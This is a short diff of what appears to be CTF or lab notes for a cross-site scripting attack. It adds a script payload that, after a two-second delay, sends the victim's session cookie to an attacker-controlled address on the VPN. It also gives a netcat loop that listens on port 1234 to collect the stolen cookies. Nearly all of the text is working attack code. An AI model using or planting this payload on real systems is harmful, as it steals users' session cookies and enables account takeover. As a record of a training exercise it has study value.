@@ -2,3 +2,9 @@ Added timeout to retrieve the proper url.
 Bassie will follow the url to the local adress and port.
 
 <script>window.setTimeout(function(){document.location='http://192.168.7.54:1234?' +document.cookie;}, 2000);</script>
+The IP adress is the adress we have in the VPN.
+The port is defined below.
+
+We listen on our local port (with netcat)
+This while loop enables us to keep accepting every connection and not shut down after a single connection is made.
+while true; do { echo -e 'HTTP/1.1 200 OK\r\n'& cat index.html; } | nc -l -p 1234 ; done  
